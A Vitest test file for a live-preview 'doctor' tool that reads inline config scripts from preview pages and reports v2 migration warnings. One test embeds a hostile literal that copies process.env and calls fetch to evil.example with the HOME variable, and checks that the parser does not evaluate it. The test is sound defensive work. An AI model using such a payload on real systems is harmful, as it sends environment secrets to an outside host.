import { describe, expect, it } from 'vitest';
import { analyzeV2Readiness, readInlineConfig } from '@doctor/readiness';
import { generateInlineScript } from '@inline/generator';
import { livePreviewScriptProps } from '@adapters/nextjs/index';
import type { DoctorFinding, DoctorProbe, DoctorResponse } from '@doctor/types';

const CMS = 'https://cms.example.com';

function probe(inline: string): DoctorProbe {
  const response = (body: string): DoctorResponse => ({ status: 200, headers: {}, body });
  return {
    publicResponse: response('<h1>Title</h1>'),
    previewResponse: response(
      `<script>${inline}</script><h1 data-payload-field="title">Title</h1>`,
    ),
  };
}

const warnings = (findings: readonly DoctorFinding[]): readonly string[] =>
  findings.filter((finding) => finding.level === 'warning').map((finding) => finding.title);

const EVERY_ROW = [
  'Referrer trust is still on',
  'Messages are accepted from any window',
  'Sanitizer is in compat mode',
  'Unchanged bindings are re-applied every message',
];

/**
 * What a 1.8.1 generator writes, byte for byte: the first line of
 * `generateInlineScript()` from the root entry of the published tarball
 * (`payload-live-preview@1.8.1`, `sha512-xpudxpZp…X+ZpmQ==`). 1.x has fourteen
 * slots, no `defaults` option, and a runtime whose empty referrer slot means
 * trust — nothing in the tuple says which generation wrote it.
 */
const FROM_1_8_1 = Object.freeze({
  /** `{ allowedOrigins: ['https://cms.example.com'] }` */
  plain: 'var __LIVE_PREVIEW_CONFIG__=[["https://cms.example.com"]];',
  /** The same with `disableReferrerDetection: true`, the one 2.0 row 1.8.1 can already set. */
  referrerOff: 'var __LIVE_PREVIEW_CONFIG__=[["https://cms.example.com"],,,,,,,,,,,true];',
});

describe('readInlineConfig', () => {
  it('reads what the generator writes, holes and all', () => {
    const inline = generateInlineScript({
      allowedOrigins: ['https://cms.example.com'],
      skipUnchanged: true,
      sanitizerPolicy: 'strict',
    });
    const config = readInlineConfig(inline);
    expect(config?.[0]).toEqual(['https://cms.example.com']);
    expect(config?.[11]).toBeNull();
    expect(config?.[14]).toBe(true);
    expect(config?.[16]).toBe('strict');
    expect(config?.[24]).toBe('v2');
  });

  it.each([
    ['[]', []],
    ['[,1]', [null, 1]],
    ['[1,,2]', [1, null, 2]],
    ['[1,]', [1, null]],
    ['[["a"],,,true,,]', [['a'], null, null, true, null, null]],
    ['["a,,b","]",",["]', ['a,,b', ']', ',[']],
    ['["\\"quoted\\",,"]', ['"quoted",,']],
    ['["\\u003Cscript>"]', ['<script>']],
  ])('turns %s into JSON %j', (literal, expected) => {
    expect(readInlineConfig(`var __LIVE_PREVIEW_CONFIG__=${literal};rest`)).toEqual(expected);
  });

  it('never evaluates the page: a hostile literal is unreadable, not run', () => {
    const hostile =
      'var __LIVE_PREVIEW_CONFIG__=[(globalThis.__pwned = process.env), fetch("https://evil.example/?" + process.env.HOME)];';
    expect(readInlineConfig(hostile)).toBeUndefined();
    expect((globalThis as { __pwned?: unknown }).__pwned).toBeUndefined();
    expect(analyzeV2Readiness(probe(hostile))).toEqual([
      expect.objectContaining({ code: 'LP0709', level: 'info' }),
    ]);
  });

  it('gives up on an unbalanced or non-array literal', () => {
    expect(readInlineConfig('var __LIVE_PREVIEW_CONFIG__=[1,[2];')).toBeUndefined();
    expect(readInlineConfig('var __LIVE_PREVIEW_CONFIG__={"a":1};')).toBeUndefined();
    expect(readInlineConfig('<h1>no runtime</h1>')).toBeUndefined();
  });
});

describe('analyzeV2Readiness', () => {
  // Until Z37 this case read "flags every runtime row for a default (v1)
  // configuration" and expected all four warnings: it took an empty slot for
  // the 1.x value while the 2.0 runtime runs the 2.0 one, so every 2.0 page
  // with its defaults left alone was told four rows were behind.
  it('reports nothing for what a 2.0 page is served with its defaults left alone', () => {
    const inline = generateInlineScript({ allowedOrigins: [CMS] });
    expect(analyzeV2Readiness(probe(inline))).toEqual([]);

    // The same through an adapter, inline and as the bootstrap of asset delivery.
    for (const delivery of ['inline', 'asset'] as const) {
      const props = livePreviewScriptProps({ allowedOrigins: [CMS], delivery });
      expect(analyzeV2Readiness(probe(props.dangerouslySetInnerHTML.__html))).toEqual([]);
    }
  });

  it('flags a row a 2.0 page sets back to its 1.x value, and only that row', () => {
    const findings = analyzeV2Readiness(
      probe(generateInlineScript({ allowedOrigins: [CMS], sanitizerPolicy: 'compat' })),
    );
    expect(findings).toEqual([
      expect.objectContaining({
        code: 'LP0709',
        level: 'warning',
        title: 'Sanitizer is in compat mode',
      }),
    ]);
    expect(findings[0]?.remedy).toContain("`sanitizerPolicy: 'compat'`");
  });

  it("flags every runtime row under `defaults: 'v1'`, and names the profile as the way out", () => {
    const direct = analyzeV2Readiness(
      probe(generateInlineScript({ allowedOrigins: [CMS], defaults: 'v1' })),
    );
    const adapter = analyzeV2Readiness(
      probe(
        livePreviewScriptProps({ allowedOrigins: [CMS], defaults: 'v1' }).dangerouslySetInnerHTML
          .__html,
      ),
    );
    for (const findings of [direct, adapter]) {
      expect(findings).toHaveLength(4);
      expect(warnings(findings)).toEqual(EVERY_ROW);
      for (const finding of findings) expect(finding.remedy).toContain("drop `defaults: 'v1'`");
    }

    // An explicit option still wins over the profile, and its row is not flagged.
    const oneRowAhead = generateInlineScript({
      allowedOrigins: [CMS],
      defaults: 'v1',
      sanitizerPolicy: 'strict',
    });
    expect(warnings(analyzeV2Readiness(probe(oneRowAhead)))).toEqual(
      EVERY_ROW.filter((title) => title !== 'Sanitizer is in compat mode'),
    );
  });

  it('reads a script that names no defaults as 1.x, and says that is what it did', () => {
    const findings = analyzeV2Readiness(probe(FROM_1_8_1.plain));
    expect(warnings(findings)).toEqual(EVERY_ROW);

    const info = findings.filter((finding) => finding.level === 'info');
    expect(info).toEqual([expect.objectContaining({ code: 'LP0709' })]);
    expect(info[0]?.detail).toContain('`defaults`');
    expect(`${info[0]?.detail ?? ''} ${info[0]?.remedy ?? ''}`).toContain('2.0.0-rc.1');
    expect(info[0]?.remedy).toContain('2.0.0-beta.0');

    // 1.8.1 has no `defaults` option, so the way out cannot be one.
    for (const finding of findings) expect(finding.remedy).not.toContain("defaults: 'v2'");
  });

  it('still judges each row of an unmarked script by its own slot', () => {
    expect(warnings(analyzeV2Readiness(probe(FROM_1_8_1.referrerOff)))).toEqual(EVERY_ROW.slice(1));
    // What a 2.0.0-beta.0 page with two rows set explicitly carries: no marker either.
    const beta =
      'var __LIVE_PREVIEW_CONFIG__=[["https://cms.example.com"],,,,,,,,,,,true,,,,"parent-or-opener"];';
    expect(warnings(analyzeV2Readiness(probe(beta)))).toEqual([
      'Sanitizer is in compat mode',
      'Unchanged bindings are re-applied every message',
    ]);
  });

  it('reports nothing when the inline config already carries the v2 runtime rows', () => {
    const inline = generateInlineScript({
      allowedOrigins: ['https://cms.example.com'],
      disableReferrerDetection: true,
      eventSourcePolicy: 'parent-or-opener',
      sanitizerPolicy: 'strict',
      skipUnchanged: true,
    });
    expect(analyzeV2Readiness(probe(inline))).toEqual([]);
  });

  it('does not judge the rows against a generation it does not know', () => {
    const later = `var __LIVE_PREVIEW_CONFIG__=[["https://cms.example.com"]${','.repeat(24)}"v3"];`;
    const findings = analyzeV2Readiness(probe(later));
    expect(findings).toEqual([expect.objectContaining({ code: 'LP0709', level: 'info' })]);
    expect(findings[0]?.detail).toContain('"v3"');
  });

  it('returns one info finding when there is no readable inline config', () => {
    const findings = analyzeV2Readiness({
      publicResponse: { status: 200, headers: {}, body: '' },
      previewResponse: { status: 200, headers: {}, body: '<h1>no runtime here</h1>' },
    });
    expect(findings).toHaveLength(1);
    expect(findings[0]?.level).toBe('info');
    // A preview behind authorizePreview serves no config to a request without credentials.
    expect(findings[0]?.remedy).toContain('--header');
    expect(findings[0]?.remedy).toContain('?previewToken=');
  });
});
